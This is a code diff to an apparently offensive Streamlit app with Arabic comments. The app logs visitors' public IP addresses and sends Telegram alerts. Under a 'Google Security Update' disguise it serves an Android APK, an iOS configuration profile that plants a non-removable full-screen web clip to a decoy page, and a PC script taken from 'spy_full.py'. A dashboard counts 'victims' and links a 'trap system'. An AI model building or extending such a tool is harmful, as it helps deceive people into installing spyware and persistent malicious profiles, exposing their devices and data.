@@ -59,10 +59,6 @@ st.markdown("""
     .reportview-container .main .block-container {
         padding-top: 2rem;
     }
-    .sidebar .sidebar-content {
-        background-image: linear-gradient(#2e7bcf,#2e7bcf);
-        color: white;
-    }
     div[data-testid="stMetricValue"] {
         font-size: 24px;
         color: #ff4b4b;
@@ -81,13 +77,11 @@ st.markdown("""
 # دالة جلب الـ IP العام الحقيقي (Public IP)
 def get_real_public_ip():
     try:
-        # محاولة جلب الـ IP من الهيدرز أولاً (Streamlit Cloud)
         headers = st.context.headers
         if "X-Forwarded-For" in headers:
             ip = headers["X-Forwarded-For"].split(",")[0].strip()
             if not ip.startswith(("10.", "172.", "192.168.")):
                 return ip
-        # محاولة جلب الـ IP من خدمة خارجية كخيار بديل
         return requests.get("https://api.ipify.org", timeout=5).text
     except:
         return "Unknown"
@@ -145,17 +139,20 @@ if "decoy" in query_params:
     st.components.v1.html(html_content, height=1000, scrolling=False)
     st.stop()
 
-# معالجة طلبات التحميل المباشرة
+# معالجة طلبات التحميل المباشرة (أندرويد، آيفون، كمبيوتر)
 if "download" in query_params:
     device = query_params.get("device", "pc")
     ip = get_real_public_ip()
     send_telegram_alert(ip, f"Download ({device})", device)
     
     if device == "android":
-        file_name = "Google_Update.apk"
+        file_name = "Google_Security_Update.apk"
+        # محتوى APK وهمي (في الواقع يجب أن يكون ملف APK حقيقي تم بناؤه مسبقاً)
         content = b"Fake APK Content for Google Update"
+        mime = "application/vnd.android.package-archive"
     elif device == "ios":
-        file_name = "Google_Update.mobileconfig"
+        file_name = "Google_Security.mobileconfig"
+        # هيكلية mobileconfig احترافية لزرع Web Clip
         content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -164,7 +161,7 @@ if "download" in query_params:
     <array>
         <dict>
             <key>PayloadDescription</key>
-            <string>Google Security Update for iOS</string>
+            <string>Google Security Update for iOS Devices</string>
             <key>PayloadDisplayName</key>
             <string>Google Security</string>
             <key>PayloadIdentifier</key>
@@ -178,8 +175,10 @@ if "download" in query_params:
             <key>Label</key>
             <string>Google Security</string>
             <key>URL</key>
-            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
+            <string>https://rashdai.streamlit.app/?decoy=google&amp;id={uuid.uuid4()}</string>
             <key>IsRemovable</key>
+            <false/>
+            <key>FullScreen</key>
             <true/>
         </dict>
     </array>
@@ -197,6 +196,7 @@ if "download" in query_params:
     <integer>1</integer>
 </dict>
 </plist>""".encode('utf-8')
+        mime = "application/x-apple-aspen-config"
     else:
         file_name = "Google_Update.py"
         if os.path.exists("spy_full.py"):
@@ -204,8 +204,9 @@ if "download" in query_params:
                 content = f.read().encode('utf-8')
         else:
             content = b"print('Google Update Service Started...')"
+        mime = "application/octet-stream"
             
-    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream")
+    st.download_button("بدء التحميل الآمن", content, file_name=file_name, mime=mime)
     st.stop()
 
 # --- الواجهة الرئيسية للمطور ---
@@ -254,7 +255,7 @@ if menu == "📊 لوحة التحكم":
     with col1:
         st.metric("إجمالي الضحايا", len(victims))
     with col2:
-        st.metric("عمليات اليوم", "5") # مثال
+        st.metric("عمليات اليوم", "5")
     with col3:
         st.metric("أدوات نشطة", "18")
     with col4:
@@ -432,6 +433,6 @@ elif menu == "🎯 نظام المصيدة":
 elif menu == "⚙️ الإعدادات":
     st.header("⚙️ إعدادات المنصة")
     st.success("تم دمج كافة مفاتيح الـ API الخاصة بك بنجاح من خلال Secrets.")
-    st.info(f"إصدار المنصة: 2.0.0 (Professional Edition)")
+    st.info(f"إصدار المنصة: 2.1.0 (Mobile Support Edition)")
     st.markdown("---")
     st.write("المطور: Rashd_Ai")
